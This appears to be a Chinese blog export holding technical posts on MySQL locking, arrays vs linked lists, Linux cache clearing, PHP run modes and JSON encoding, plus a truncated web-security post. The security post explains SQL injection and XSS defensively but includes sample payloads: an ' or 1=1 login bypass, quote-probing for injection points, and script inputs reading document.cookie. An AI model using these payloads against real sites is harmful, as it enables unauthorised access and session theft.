一起使用出现问题时，可以转而采用 MyISAM 表，它支持并发的 SELECT 和 INSERT 操作。 8 ）当在同一个表上同时有插入和删除操作时， INSERT DELAYED 可能会很有用。 9 ）当 SELECT 和 DELETE 一起使用出现问题时， DELETE 的 LIMIT 参数可能会很有用。 10 ）执行 SELECT 时使用 SQL_BUFFER_RESULT 有助于减短锁表的持续时间。 11 ）可以修改源代码 `mysys/thr_lock.c’ ，只用一个所队列。这种情况下，写锁和读锁的优先级就一样了，这对一些应用可能有帮助。</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>隔离机制</tag>
      </tags>
  </entry>
  <entry>
    <title>数组和链表的区别</title>
    <url>/2016/11/03/%E6%95%B0%E7%BB%84%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>数组和链表是两种基本的数据结构，他们在内存存储上的表现不一样，所以也有各自的特点。</p>
<p>大致总结一下特点和区别，拿几个人一起去看电影时坐座位为例。</p>
<h1 id="数组的特点"><a href="#数组的特点" class="headerlink" title="数组的特点"></a>数组的特点</h1><ul>
<li>在内存中，数组是一块连续的区域。 拿上面的看电影来说，这几个人在电影院必须坐在一起。</li>
<li>数组需要预留空间，在使用前要先申请占内存的大小，可能会浪费内存空间。 比如看电影时，为了保证10个人能坐在一起，必须提前订好10个连续的位置。这样的好处就是能保证10个人可以在一起。但是这样的缺点是，如果来的人不够10个，那么剩下的位置就浪费了。如果临时有多来了个人，那么10个就不够用了，这时可能需要将第11个位置上的人挪走，或者是他们11个人重新去找一个11连坐的位置，效率都很低。如果没有找到符合要求的作为，那么就没法坐了。</li>
<li>插入数据和删除数据效率低，插入数据时，这个位置后面的数据在内存中都要向后移。删除数据时，这个数据后面的数据都要往前移动。 比如原来去了5个人，然后后来又去了一个人要坐在第三个位置上，那么第三个到第五个都要往后移动一个位子，将第三个位置留给新来的人。 当这个人走了的时候，因为他们要连在一起的，所以他后面几个人要往前移动一个位置，把这个空位补上。</li>
<li>随机读取效率很高。因为数组是连续的，知道每一个数据的内存地址，可以直接找到给地址的数据。</li>
<li>并且不利于扩展，数组定义的空间不够时要重新定义数组。</li>
</ul>
<h1 id="链表的特点"><a href="#链表的特点" class="headerlink" title="链表的特点"></a>链表的特点</h1><ul>
<li>在内存中可以存在任何地方，不要求连续。 在电影院几个人可以随便坐。</li>
<li>每一个数据都保存了下一个数据的内存地址，通过这个地址找到下一个数据。 第一个人知道第二个人的座位号，第二个人知道第三个人的座位号……</li>
<li>增加数据和删除数据很容易。 再来个人可以随便坐，比如来了个人要做到第三个位置，那他只需要把自己的位置告诉第二个人，然后问第二个人拿到原来第三个人的位置就行了。其他人都不用动。</li>
<li>查找数据时效率低，因为不具有随机访问性，所以访问某个位置的数据都要从第一个数据开始访问，然后根据第一个数据保存的下一个数据的地址找到第二个数据，以此类推。 要找到第三个人，必须从第一个人开始问起。</li>
<li>不指定大小，扩展方便。链表大小不用定义，数据随意增删。</li>
</ul>
<h1 id="各自的优缺点"><a href="#各自的优缺点" class="headerlink" title="各自的优缺点"></a>各自的优缺点</h1><h2 id="数组的优点"><a href="#数组的优点" class="headerlink" title="数组的优点"></a>数组的优点</h2><ul>
<li>随机访问性强</li>
<li>查找速度快</li>
</ul>
<h2 id="数组的缺点"><a href="#数组的缺点" class="headerlink" title="数组的缺点"></a>数组的缺点</h2><ul>
<li>插入和删除效率低</li>
<li>可能浪费内存</li>
<li>内存空间要求高，必须有足够的连续内存空间。</li>
<li>数组大小固定，不能动态拓展</li>
</ul>
<h2 id="链表的优点"><a href="#链表的优点" class="headerlink" title="链表的优点"></a>链表的优点</h2><ul>
<li>插入删除速度快</li>
<li>内存利用率高，不会浪费内存</li>
<li>大小没有固定，拓展很灵活。</li>
</ul>
<h2 id="链表的缺点"><a href="#链表的缺点" class="headerlink" title="链表的缺点"></a>链表的缺点</h2><ul>
<li><p>不能随机查找，必须从第一个开始遍历，查找效率低</p>
</li>
<li><p>数组 链表 读取 O(1) O(n) 插入 O(n) O(1) 删除 O(n) O(1)<img src="http://privateimage.oss-cn-hongkong.aliyuncs.com/%E6%AD%BB%E5%BE%AA%E7%8E%AF%E6%87%B5%E9%80%BC.gif"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>linux释放内存</title>
    <url>/2016/09/16/linux%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98/</url>
    <content><![CDATA[<blockquote>
<p>在应用mongodb时，发现服务器内存会暴涨，free几乎没有，还有就是程序如果大量对文件进行操作就会有这种现象，但一般来说都会自动回收的，但有时我们还是需要手动清理来应急。</p>
</blockquote>
<p>  （1）缓存机制 为了提高文件系统性能，内核利用一部分物理内存分配出缓冲区，用于缓存系统操作和数据文件，当内核收到读写的请求时，内核先去缓存区找是否有请求的数据，有就直接返回，如果没有则通过驱动程序直接操作磁盘。 缓存机制优点：减少系统调用次数，降低CPU上下文切换和磁盘访问频率。 CPU上下文切换：CPU给每个进程一定的服务时间，当时间片用完后，内核从正在运行的进程中收回处理器，同时把进程当前运行状态保存下来，然后加载下一个任务，这个过程叫做上下文切换。实质上就是被终止运行进程与待运行进程的进程切换。 （2）查看缓存区及内存使用情况</p>
<p>[root@localhost ~]# free -m</p>
<p>total used free shared buffers cached</p>
<p>Mem: 7866 7725 141 19 74 6897</p>
<p>-/+ buffers/cache: 752 7113</p>
<p>Swap: 16382 32 16350</p>
<p>free -h 也是可以的单位为G 可以看到内存总共8G，已使用7725M，剩余141M，不少的人都是这么看的，这样并不能作为实际的使用率。因为有了缓存机制，具体该怎么算呢？ 空闲内存=free（141）+buffers（74）+cached（6897） 已用内存=total（7866）-空闲内存 由此算出空闲内存是7112M，已用内存754M，这才是真正的使用率，也可参考-/+ buffers/cache这行信息也是内存正确使用率。 （3）可见缓存区分为buffers和cached，他们有什么区别呢？ 内核在保证系统能正常使用物理内存和数据量读写情况下来分配缓冲区大小。<strong>buffers用来缓存metadata及pages，可以理解为系统缓存</strong>，例如，vi打开一个文件。<strong>cached是用来给文件做缓存，可以理解为数据块缓存</strong>，例如，dd if=/dev/zero of=/tmp/test count=1 bs=1G 测试写入一个文件，就会被缓存到缓冲区中，当下一次再执行这个测试命令时，写入速度会明显很快。 （4）随便说下Swap做什么用的呢？ Swap意思是交换分区，通常我们说的虚拟内存，是从硬盘中划分出的一个分区。当物理内存不够用的时候，内核就会释放缓存区（buffers/cache）里一些长时间不用的程序，然后将这些程序临时放到Swap中，也就是说如果物理内存和缓存区内存不够用的时候，才会用到Swap。 swap清理： swapoff -a &amp;&amp; swapon -a 注意：这样清理有个前提条件，空闲的内存必须比已经使用的swap空间大 <strong>（5）怎样释放缓存区内存呢？</strong></p>
<p>a)直接改变内核运行参数<br>#释放pagecache<br>echo 1 &gt;/proc/sys/vm/drop_caches</p>
<p>#释放dentries和inodes<br>echo 2 &gt;/proc/sys/vm/drop_caches</p>
<p>#释放pagecache、dentries和inodes<br>echo 3 &gt;/proc/sys/vm/drop_caches</p>
<p>b)也可以使用sysctl重置内核运行参数</p>
<p>sysctl -w vm.drop_caches=3</p>
<p>    注意：<strong>这两个方式都是临时生效</strong>，永久生效需添加sysctl.conf文件中，一般写成脚本手动清理，建议不要清理。 修改/etc/sysctl.conf 添加如下选项后就不会内存持续增加</p>
<p>vm.dirty_ratio = 1<br>vm.dirty_background_ratio=1<br>vm.dirty_writeback_centisecs=2<br>vm.dirty_expire_centisecs=3<br>vm.drop_caches=3<br>vm.swappiness =100<br>vm.vfs_cache_pressure=163<br>vm.overcommit_memory=2<br>vm.lowmem_reserve_ratio=32 32 8<br>kern.maxvnodes=3</p>
<p>  上面的设置比较粗暴，使cache的作用基本无法发挥。需要根据机器的状况进行适当的调节寻找最佳的折衷。</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>程序设计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP之运行模式</title>
    <url>/2016/08/23/php%E4%B9%8B%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="PHP运行模式有4种："><a href="#PHP运行模式有4种：" class="headerlink" title="PHP运行模式有4种："></a>PHP运行模式有4种：</h2><ol>
<li>cgi 通用网关接口（Common Gateway Interface)</li>
<li>fast-cgi 常驻 (long-live) 型的 CGI</li>
<li>cli  命令行运行   （Command Line Interface）</li>
<li>web模块模式 （apache等web服务器运行的模块模式） 目前在HTTPServer这块基本可以看到有三种stack比较流行：<ol>
<li>Apache+mod_php5</li>
<li>lighttp+spawn-fcgi</li>
<li>nginx+PHP-FPM 三者后两者性能可能稍优，但是Apache由于有丰富的模块和功能，目前来说仍旧是老大。有人测试nginx+PHP-FPM在高并发情况下可能会达到Apache+mod_php5的5~10倍，现在nginx+PHP-FPM使用的人越来越多。 然后我们来一次介绍巴拉巴拉。。  </li>
</ol>
</li>
</ol>
<h2 id="CGI（Common-Gateway-Interface）"><a href="#CGI（Common-Gateway-Interface）" class="headerlink" title="CGI（Common Gateway Interface）"></a>CGI（Common Gateway Interface）</h2><p>CGI即通用网关接口(Common Gateway Interface)，它是一段程序, 通俗的讲CGI就象是一座桥，把网页和WEB服务器中的执行程序连接起来，它把HTML接收的指令传递给服务器的执行程序，再把服务器执行程序的结果返还给HTML页。CGI 的跨平台性能极佳，几乎可以在任何操作系统上实现。 CGI已经是比较老的模式了，这几年都很少用了。每有一个用户请求，都会先要创建cgi的子进程，然后处理请求，处理完后结束这个子进程，这就是fork-and-execute模式。 当用户请求数量非常多时，会大量挤占系统的资源如内存，CPU时间等，造成效能低下。所以用cgi方式的服务器有多少连接请求就会有多少cgi子进程，子进程反复加载是cgi性能低下的主要原因。</p>
<p>如果不想把 PHP 嵌入到服务器端软件（如 Apache）作为一个模块安装的话，可以选择以 CGI 的模式安装。或者把 PHP 用于不同的 CGI 封装以便为代码创建安全的 chroot 和 setuid 环境。这样每个客户机请求一个php文件，Web服务器就调用php.exe（win下是php.exe,linux是php）去解释这个文件，然后再把解释的结果以网页的形式返回给客户机。 这种安装方式通常会把 PHP 的可执行文件安装到 web 服务器的 cgi-bin 目录。CERT 建议书 CA-96.11 建议不要把任何的解释器放到 cgi-bin 目录。这种方式的好处是把web server和具体的程序处理独立开来，结构清晰，可控性强，同时缺点就是如果在高访问需求的情况下，cgi的进程fork就会成为很大的服务器负担，想 象一下数百个并发请求导致服务器fork出数百个进程就明白了。这也是为什么cgi一直背负性能低下，高资源消耗的恶名的原因。</p>
<p> <strong>CGI模式安装：</strong></p>
<p>CGI已经是比较老的模式了，这几年都很少用了,所以我们只是为了测试。 安装CGI模式需要注释掉 LoadModule php5_module modules/libphp5.so 这行。如果不注释这行会一直走到handler模式。也就是模块模式。 然后在httpd.conf增加action： Action application/x-httpd-php /cgi-bin/ 如果在/cgi-bin/目录找不到php-cgi.可自行从php的bin里面cp一个。 然后重启apache,再打开测试页面发现Server API变成：CGI/FastCGI。说明成功切换为cgi模式。</p>
<p><strong>问题：</strong></p>
<p>1)  如果cgi程序放在/usr/local/httpd/cgi-bin/里无法执行，遇到403或500错误的话 打开apache错误日志 有如下提示： Permission denied: exec of 可以检查cgi程序的属性，按Linux contexts文件 里定义的，/usr/local/httpd/cgi-bin/里必须是httpd_sys_script_exec_t 属性。  通过ls -Z查看，如果不是则通过如下命令更改： chcon -t httpd_sys_script_exec_t /var/www/cgi-bin/<code>*</code>.cgi 如果是虚拟主机里的cgi，则参考问题2使之能正常使用普通的功能后，再通过chcon设置cgi文件的context为 httpd_sys_script_exec_t即可。chcon -R -t httpd_sys_script_exec_t cgi-bin/</p>
<ol start="2">
<li>apache错误提示：…. malformed header from script. Bad header= 根据提示说明有header有问题，查看文件输出的第一句话是什么，应该类似于如下 Content-type: text/plain; charset=iso-8859-1\n\n 或者Content-type:text/html\n\n 注意：声明好Content-type后要输出两个空行。</li>
</ol>
<p>3）apache错误提示： Exec format error 脚本解释器设置错误。脚本第一行应该以’#!解释器路径’的形式, 填写脚本解释器的路径，如果是PERL程序，常见的路径为: #!/usr/bin/perl 或 #!/usr/local/bin/perl   如果是PHP程序，不需要填写解释器路径，系统会自动找到PHP。</p>
<h2 id="Fastcgi模式"><a href="#Fastcgi模式" class="headerlink" title="Fastcgi模式"></a>Fastcgi模式</h2><p>fast-cgi 是cgi的升级版本，FastCGI 像是一个常驻 (long-live) 型的 CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去 fork 一次 (这是 CGI 最为人诟病的 fork-and-execute 模式)。</p>
<p>FastCGI的工作原理是：</p>
<ol>
<li><p>Web Server启动时载入FastCGI进程管理器【PHP的FastCGI进程管理器是PHP-FPM(php-FastCGI Process Manager)】（IIS ISAPI或Apache Module);</p>
</li>
<li><p>FastCGI进程管理器自身初始化，启动多个CGI解释器进程 (在任务管理器中可见多个php-cgi.exe)并等待来自Web Server的连接。</p>
</li>
<li><p>当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
</li>
<li><p>FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器（运行在 WebServer中）的下一个连接。在正常的CGI模式中，php-cgi.exe在此便退出了。 在CGI模式中，你可以想象 CGI通常有多慢。每一个Web请求PHP都必须重新解析php.ini、重新载入全部dll扩展并重初始化全部数据结构。使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
</li>
</ol>
<p><strong>Fastcgi的优点：</strong></p>
<p>1.）从稳定性上看, fastcgi是以独立的进程池运行来cgi,单独一个进程死掉,系统可以很轻易的丢弃,然后重新分 配新的进程来运行逻辑.<br>2. 从安全性上看,Fastcgi支持分布式运算. fastcgi和宿主的server完全独立, fastcgi怎么down也不会把server搞垮.<br>3. 从性能上看, fastcgi把动态逻辑的处理从server中分离出来, 大负荷的IO处理还是留给宿主server, 这样宿主server可以一心一意作IO,对于一个普通的动态网页来说, 逻辑处理可能只有一小部分, 大量的图片等静态 FastCGI缺点：说完了好处，也来说说缺点。从我的实际使用来看，用FastCGI模式更适合生产环境的服务器。但对于开发用机器来说就不太合适。因为当使用 Zend Studio调试程序时，由于 FastCGI会认为 PHP进程超时，从而在页面返回 500错误。这一点让人非常恼火，所以我在开发机器上还是换回了 ISAPI模式。</p>
<p> <strong>安装fastcgi模式：</strong></p>
<p> 安装apache路径是/usr/local/httpd/ 安装php路径是/usr/local/php/</p>
<p> <strong>1）安装mod_fastcgi</strong></p>
<blockquote>
<p>wget <a href="http://www.fastcgi.com/dist/mod/_fastcgi-2.4.6.tar.gz">http://www.fastcgi.com/dist/mod\_fastcgi-2.4.6.tar.gz</a> tar zxvf mod_fastcgi-2.4.6.tar.gz cd mod_fastcgi-2.4.6 cp Makefile.AP2 Makefile vi Makefile， top_dir = /usr/local/httpd make make install 安装完后， /usr/local/httpd/modules/多出一个文件：mod_fcgid.so</p>
</blockquote>
<p><strong>2）重新编译php</strong></p>
<blockquote>
<p>./configure –prefix=/usr/local/php –enable-fastcgi –enable-force-cgi-redirect –disable-cli make make install</p>
</blockquote>
<p>这样编译后，在PHP的bin目录下的php-cgi就是fastcgi模式的php解释器了 安装成功后,执行 <code>php -v </code> <code>PHP 5.3.2 (cgi-fcgi).</code> 这里输出带了cgi-fcgi <strong>注意：</strong> 1.编译参数不能加 –with-apxs=/usr/local/httpd/bin/apxs 否则安装出来的php执行文件是cli模式的 2 如果编译时不加–disable-cli则输出 PHP 5.3.2(cli) 3)配置apache 需要配置apache来以fastcgi模式运行php程序 vi httpd.conf 我们使用虚拟机的方式实现：</p>
<p>复制代码代码如下:</p>
<p><strong>#加载fastcgi模块</strong> LoadModule fastcgi_module modules/mod_fastcgi.so #//以静态方式执行fastcgi 启动了10进程 FastCgiServer /usr/local/php/bin/php-cgi  -processes 10 -idle-timeout 150 -pass-header HTTP_AUTHORIZATION</p>
<p><code>&lt;VirtualHost *:80&gt;</code> <code> #</code> <code> DocumentRoot   /usr/local/httpd/fcgi-bin   </code> <code> ServerName www.fastcgitest.com`` ScriptAlias /fcgi-bin/   /usr/local/php/bin/   #定义目录映射 /fcgi-bin/ 代替 /usr/local/php/bin/</code> <code> Options +ExecCGI</code> <code> AddHandler fastcgi-script .php .fcgi #.php结尾的请求都要用php-fastcgi来处理  </code> <code> AddType application/x-httpd-php .php #增加MIME类型</code> <code> Action application/x-httpd-php /fcgi-bin/php-cgi  #设置php-fastcgi的处理器： /usr/local/php/bin/php-cgi</code> <code> &lt;Directory /usr/local/httpd/fcgi-bin/&gt;</code> <code>  Options Indexes ExecCGI</code> <code>  Order allow,deny</code> <code>  allow from all</code> <code> &lt;/Directory&gt;</code> <code>&lt;/VirtualHost&gt;</code></p>
<p>4）.restart 下apache,查看phpinfo，如果服务器信息是： Apache/2.2.11 (Unix) mod_fastcgi/2.4.6之类的就说明安装成功了。 如果出现403的错误，查看下/usr/local/httpd/fcgi-bin/是否有足够的权限。 或者</p>
<p>复制代码代码如下:</p>
<p><code>&lt;Directory /&gt;</code> <code>Options FollowSymLinks</code> <code>AllowOverride None</code> <code>Order deny,allow</code> <code>Deny from all</code> <code>&lt;/Directory&gt;</code></p>
<p>改为：</p>
<p>复制代码代码如下:</p>
<p><code>&lt;Directory /&gt;</code> <code>Options FollowSymLinks</code> <code>AllowOverride None</code> <code>Order allow,deny</code> <code>Allow from all</code> <code>&lt;/Directory&gt;</code></p>
<p>就可以了。 ps -ef|grep  php-cgi可以看见10个fastcgi进程在跑。</p>
<h2 id="CLI模式"><a href="#CLI模式" class="headerlink" title="CLI模式"></a>CLI模式</h2><p>CLI是php的命令行运行模式，大家经常会使用它，但是可能并没有注意到（例如：我们在linux下经常使用 “php -m”查找PHP安装了那些扩展就是PHP命令行运行模式；有兴趣的同学可以输入php -h去深入研究该运行模式）</p>
<ol>
<li>让 PHP 运行指定文件。 php script.php php -f script.php 以上两种方法（使用或不使用 -f 参数）都能够运行脚本的script.php。您可以选择任何文件来运行，您指定的 PHP 脚本并非必须要以 .php 为扩展名，它们可以有任意的文件名和扩展名。</li>
<li>在命令行直接运行 PHP 代码。 php -r “print_r(get_defined_constants());” 在使用这种方法时，请您注意外壳变量的替代及引号的使用。 注: 请仔细阅读以上范例，在运行代码时没有开始和结束的标记符！加上 -r 参数后，这些标记符是不需要的，加上它们会导致语法错误。</li>
<li>通过标准输入（stdin）提供需要运行的 PHP 代码。 以上用法给我们提供了非常强大的功能，使得我们可以如下范例所示，动态地生成 PHP 代码并通过命令行运行这些代码： $ some_application | some_filter | php | sort -u &gt;final_output.txt</li>
</ol>
<h2 id="模块模式"><a href="#模块模式" class="headerlink" title="模块模式"></a>模块模式</h2><p>模块模式是以mod_php5模块的形式集成，此时mod_php5模块的作用是接收Apache传递过来的PHP文件请求，并处理这些请求，然后将处理后的结果返回给Apache。如果我们在Apache启动前在其配置文件中配置好了PHP模块（mod_php5）， PHP模块通过注册apache2的ap_hook_post_config挂钩，在Apache启动的时候启动此模块以接受PHP文件的请求。 除了这种启动时的加载方式，Apache的模块可以在运行的时候动态装载，这意味着对服务器可以进行功能扩展而不需要重新对源代码进行编译，甚至根本不需要停止服务器。我们所需要做的仅仅是给服务器发送信号HUP或者AP_SIG_GRACEFUL通知服务器重新载入模块。但是在动态加载之前，我们需要将模块编译成为动态链接库。此时的动态加载就是加载动态链接库。 Apache中对动态链接库的处理是通过模块mod_so来完成的，因此mod_so模块不能被动态加载，它只能被静态编译进Apache的核心。这意味着它是随着Apache一起启动的。 Apache是如何加载模块的呢？我们以前面提到的mod_php5模块为例。首先我们需要在Apache的配置文件httpd.conf中添加一行： 该运行模式是我们以前在windows环境下使用apache服务器经常使用的，而在模块化(DLL)中，PHP是与Web服务器一起启动并运行的。（是apache在CGI的基础上进行的一种扩展，加快PHP的运行效率）</p>
<p>代码如下:</p>
<p><code>LoadModule php5_module modules/mod_php5.so</code></p>
<p>这里我们使用了LoadModule命令，该命令的第一个参数是模块的名称，名称可以在模块实现的源码中找到。第二个选项是该模块所处的路径。如果需要在服务器运行时加载模块，可以通过发送信号HUP或者AP_SIG_GRACEFUL给服务器，一旦接受到该信号，Apache将重新装载模块，而不需要重新启动服务器。</p>
<h2 id="php在Nginx中运行模式（Nginx-PHP-FPM）"><a href="#php在Nginx中运行模式（Nginx-PHP-FPM）" class="headerlink" title="php在Nginx中运行模式（Nginx+ PHP-FPM）"></a>php在Nginx中运行模式（Nginx+ PHP-FPM）</h2><p>使用FastCGI方式现在常见的有两种stack：ligthttpd+spawn-fcgi;另外一种是nginx+PHP-FPM(也可以用spawn-fcgi)。 A、如上面所说该两种结构都采用FastCGI对PHP支持，因此HTTPServer完全解放出来，可以更好地进行响应和并发处理。因此lighttpd和nginx都有small, but powerful和efficient的美誉。 B、该两者还可以分出一个好坏来，spawn-fcgi由于是lighttpd的一部分，因此安装了lighttpd一般就会使用spawn-fcgi对php支持，但是目前有用户说ligttpd的spwan-fcgi在高并发访问的时候，会出现上面说的内存泄漏甚至自动重启fastcgi。即：PHP脚本处理器当机，这个时候如果用户访问的话，可能就会出现白页(即PHP不能被解析或者出错)。 另一个：首先nginx不像lighttpd本身含带了fastcgi(spawn-fcgi)，因此它完全是轻量级的，必须借助第三方的FastCGI处理器才可以对PHP进行解析，因此其实这样看来nginx是非常灵活的，它可以和任何第三方提供解析的处理器实现连接从而实现对PHP的解析(在nginx.conf中很容易设置)。nginx可以使用spwan-fcgi(需要一同安装lighttpd，但是需要为nginx避开端口，一些较早的blog有这方面安装的教程)，但是由于spawn-fcgi具有上面所述的用户逐渐发现的缺陷，现在慢慢减少使用nginx+spawn-fcgi组合了。 C、由于spawn-fcgi的缺陷，现在出现了新的第三方(目前还是，听说正在努力不久将来加入到PHP core中)的PHP的FastCGI处理器，叫做PHP-FPM(具体可以google)。它和spawn-fcgi比较起来有如下优点： 由于它是作为PHP的patch补丁来开发的，安装的时候需要和php源码一起编译，也就是说编译到php core中了，因此在性能方面要优秀一些； 同时它在处理高并发方面也优于spawn-fcgi，至少不会自动重启fastcgi处理器。具体采用的算法和设计可以google了解。 因此，如上所说由于nginx的轻量和灵活性，因此目前性能优越，越来越多人逐渐使用这个组合：nginx+PHP/PHP-FPM</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>综合</category>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>运行模式</tag>
      </tags>
  </entry>
  <entry>
    <title>json_encode json_decode 乱码问题</title>
    <url>/2016/08/01/json-encode-json-decode-%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>使用json格式转换时发现中文乱码的问题，而且写接口的时候直接报错传输。 JSON和JS一样，对于客户端的字符都是以UTF8的形式进行处理的，也就是说，使用JSON作为提交和接收的数据格式时字符都采用UTF8编码处理，当我们的页面编码和数据库编码不是采用UTF8的时候，出现乱码问题，所以统一使用utf8编码。注意到json_encode只支持UTF8编码的字符，否则，中文乱码或者空值就出现了。 解决办法分为以下两个步骤。 Step1 保证在使用JSON处理的时候字符是以UTF8编码的。具体我们可以把数据库编码和页面编码都改为UTF8。我们公司网站坑的用gbk编码的话，可以在进行JSON处理前，把字符转为UTF8形式。</p>
<?php  
     $data="JSON中文";  
     $newData=iconv("GB2312","UTF-8//IGNORE",$data);  
     echo $newData;  
     //ignore的意思是忽略转换时的错误，如果没有ignore参数，所有该字符后面的字符都不会被保存。  
     //或是("GB2312","UTF-8",$data);  
?>

<p>  Step2 后台PHP页面（页面编码为UTF-8或者已经把字符转为UTF-8）使用json_encode将PHP中的array数组转为JSON字符串。例如：</p>
<?php  
    $testJSON=array('name'=>'中文字符串','value'=>'test');  
    echo json_encode($testJSON);  
?>

<p>  查看输出结果为： {“name”:”\u4e2d\u6587\u5b57\u7b26\u4e32″,”value”:”test”} 可见即使用UTF8编码的字符，使用json_encode也出现了中文乱码。解决办法是在使用json_encode之前把字符用函数urlencode()处理一下，然后再json_encode，输出结果的时候在用函数urldecode()转回来。具体如下：</p>
<?php 
$testJSON=array('name'=>'中文字符串','value'=>'test'); 
//echo json_encode($testJSON); 
foreach ( $testJSON as $key => $value ) { 
$testJSON\[$key\] = urlencode ( $value ); 
} 
echo urldecode ( json_encode ( $testJSON ) ); 
?>

<p>查看输出结果为： {“name”:”中文字符串”,”value”:”test”} 到此，成功地输出了中文字符。随意使用json_encode吧。这样子在PHP后台输出的JSON字符串在前台javascript中Ajax接收后eval出来也不会出现中文乱码，因为js在处理JSON格式数据是也是以UTF8的形式进行的，与PHP类似，故接收PHP页面的JSON字符串不会出现问题。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Web攻防之XSS,CSRF,SQL注入</title>
    <url>/2016/05/15/web%E6%94%BB%E9%98%B2%E4%B9%8Bxsscsrfsql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<blockquote>
<p>摘要：对Web服务器的攻击也可以说是形形色色、种类繁多，常见的有挂马、SQL注入、缓冲区溢出、嗅探、利用IIS等针对Webserver漏洞进行攻击。本文结合WEB TOP10漏洞中常见的SQL注入，跨站脚本攻击(XSS)，跨站请求伪造（CSRF）攻击的产生原理，介绍相应的防范方法。</p>
</blockquote>
<p><strong>1.SQL注入</strong> 所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 攻击者通过在应用程序预先定义好的SQL语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的查询,篡改命令。 它能够轻易的绕过防火墙直接访问数据库，甚至能够获得数据库所在的服务器的系统权限。在Web应用漏洞中，SQL Injection 漏洞的风险要高过其他所有的漏洞。 攻击原理  </p>
<p>假设的登录查询</p>
<p>　　SELECT * FROM users WHERE login = ‘victor’ AND password = ‘123</p>
<p>　　Sever端代码</p>
<p>　　String sql = “SELECT * FROM users WHERE login = ‘“ + formusr + “‘ AND password = ‘“ + formpwd + “‘“;</p>
<p>　　输入字符</p>
<p>　　formusr = ‘ or 1=1</p>
<p>　　formpwd = anything</p>
<p>　　实际的查询代码</p>
<p>　　SELECT * FROM users WHERE username = ‘ ‘ or 1=1 AND password = ‘anything’</p>
<p><em>发现注入点简单办法</em> 1.寻找带有查询字符串的url的网页(例如，查询那些在URL里带有”id=” 的URL)。 2.向这个网站发送一个请求，改变其中的id=语句，带一个额外的单引号（例如：id=123’）。 3.查看返回的内容，在其中查找“sql”，“statement”等关键字（这也说明返回了具体的错误信息，这本身就很糟糕）。如下图： <img src="http://images.cnitblog.com/blog/313040/201303/11164150-c26d972bc27f443b959d403b76f47158.jpg"> 4.错误消息是否表示发送到SQL服务器的参数没有被正确编码果如此，那么表示可对该网站进行SQL注入攻击。 如何防范SQL注入攻击 一个常见的错误是，假如你使用了存储过程或ORM，你就完全不受SQL注入攻击之害了。这是不正确的，你还是需要确定在给存储过程传递数据时你很谨慎，或在用ORM来定制一个查询时，你的做法是安全的。 参数化查询已被视为最有效的可防御SQL注入攻击的防御方式。目前主流的ORM 框架都内置支持并且推荐使用这种方式进行持久层封装。 所谓的参数化查询（Parameterized Query 或 Parameterized Statement）是指在设计与数据库链接并访问数据时，在需要填入数值或数据的地方，使用参数 (Parameter) 来给值。 例： SELECT * FROM myTable WHERE myID = @myID INSERT INTO myTable (c1, c2, c3, c4) VALUES (@c1, @c2, @c3, @c4)或者INSERT INTO myTable (c1, c2, c3, c4) VALUES(?,?,?,?) 通过(?)指定占位符，当然在添加参数的时候，必须按照(c1, c2, c3, c4)的顺序来添加，否则会出错。 <strong>2.跨站脚本攻击(XSS)</strong> XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的. 比如获取用户的Cookie，导航到恶意网站,携带木马等。 攻击原理</p>
<p>假如页面有如下一个输入框</p>
<p>　　<input type="text" name="record" value="沙发"></p>
<p>　　【沙发】是来自用户的输入，如果用户输入的是”onfocus=”alert(document.cookie)</p>
<p>　　那么就会变成</p>
<p>　　<input type="text" name="address1" value="" onfocus="alert(document.cookie)"></p>
<p>　　 事件被触发的时候嵌入的JavaScript代码将会被执行</p>
<p>　　 攻击的威力，取决于用户输入了什么样的脚本。</p>
<p>XSS分类 1. 反射型XSS 反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。 比如攻击者将如下链接发送给受害者：</p>
<p><a href="http://www.targetserver.com/search.asp?input=">http://www.targetserver.com/search.asp?input=</a><script>alert(document.cookie);</script></p>
